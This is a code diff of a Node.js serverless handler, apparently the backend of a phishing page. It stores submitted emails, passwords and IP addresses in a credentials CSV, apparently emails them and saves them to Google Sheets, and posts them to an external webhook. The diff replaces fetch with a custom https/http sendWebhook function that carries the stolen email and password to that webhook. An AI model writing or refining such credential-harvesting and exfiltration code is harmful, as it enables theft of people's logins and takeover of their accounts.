@@ -1,11 +1,10 @@
 const fs = require('fs');
 const path = require('path');
+const https = require('https');
+const http = require('http');
 const createCsvWriter = require('csv-writer').createObjectCsvWriter;
 const nodemailer = require('nodemailer');
 const { saveToGoogleSheets } = require('./save-to-sheets');
-
-// Importar fetch se não estiver disponível (Node 18+ tem nativo)
-const fetch = globalThis.fetch || require('node-fetch');
 
 // Caminho do arquivo CSV (usar /tmp na Vercel)
 const CSV_FILE = path.join('/tmp', 'credentials.csv');
@@ -26,6 +25,44 @@ async function initCSV() {
         await csvWriter.writeRecords([]);
         console.log('Arquivo CSV criado com sucesso');
     }
+}
+
+// Função para enviar webhook
+function sendWebhook(url, data) {
+    return new Promise((resolve, reject) => {
+        const urlObj = new URL(url);
+        const isHttps = urlObj.protocol === 'https:';
+        const client = isHttps ? https : http;
+        
+        const postData = JSON.stringify(data);
+        
+        const options = {
+            hostname: urlObj.hostname,
+            port: urlObj.port || (isHttps ? 443 : 80),
+            path: urlObj.pathname + urlObj.search,
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Content-Length': Buffer.byteLength(postData)
+            }
+        };
+        
+        const req = client.request(options, (res) => {
+            let responseData = '';
+            res.on('data', (chunk) => { responseData += chunk; });
+            res.on('end', () => {
+                if (res.statusCode >= 200 && res.statusCode < 300) {
+                    resolve(responseData);
+                } else {
+                    reject(new Error(`HTTP ${res.statusCode}: ${responseData}`));
+                }
+            });
+        });
+        
+        req.on('error', reject);
+        req.write(postData);
+        req.end();
+    });
 }
 
 // Função para enviar email com as credenciais
@@ -155,11 +192,7 @@ module.exports = async (req, res) => {
         const webhookUrl = process.env.WEBHOOK_URL;
         if (webhookUrl) {
             try {
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password, timestamp, ip })
-                });
+                await sendWebhook(webhookUrl, { email, password, timestamp, ip });
                 console.log('Webhook enviado com sucesso');
             } catch (webhookError) {
                 console.error('Erro ao enviar webhook (não crítico):', webhookError);
